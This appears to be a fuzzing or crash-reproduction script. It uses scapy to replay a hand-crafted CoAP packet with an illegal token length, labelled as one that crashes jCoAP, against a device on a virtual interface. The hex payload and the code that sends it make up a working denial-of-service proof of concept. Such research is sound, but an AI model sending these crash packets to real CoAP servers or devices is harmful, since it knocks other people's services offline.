import scapy.all as scapy
import time
from binascii import unhexlify

# Ilegal token length
packet_lst_crash_jcoap_1 = [
                        "ecf1f8d5476becf1f8d5476b08004500004cd0cd4000401183440a2f00010a0dd252c79b1633003817aa49012c06b2da79e3ef46bbb1b568656c6c6fc3000000ff0a2047455420312072657175657374207061796c6f61643a20",
                           ]

    # manage to solve the sending packets to server issue   
def verify_lst_server(lst):
    count = 2
    for idx, pkt in enumerate(lst):
        # time.sleep(3)
        print("Packet: ", idx)
        while(count > 1):
            frame = scapy.Ether(unhexlify(pkt))
            frame[scapy.Ether].src ='ec:f1:f8:d5:47:6b'
            frame[scapy.Ether].dst = 'ec:f1:f8:d5:47:6b'
            # pkt[IP].src = "10.42.0.100"
            frame[scapy.IP].src = '10.47.0.1'
            # frame[scapy.IP]
            frame[scapy.IP].dst = '10.13.210.82'
            del frame[scapy.IP].chksum
            del frame[scapy.UDP].chksum
            scapy.sendp(frame,iface = 'veth5')
            time.sleep(0.5)
            count = count - 1
            print(count)
            # time.sleep(1)
        count = 2


# test replicatble crashed packets to the board
count = 1
while(count>0):
    verify_lst_server(packet_lst_crash_jcoap_1)
    count = count -1

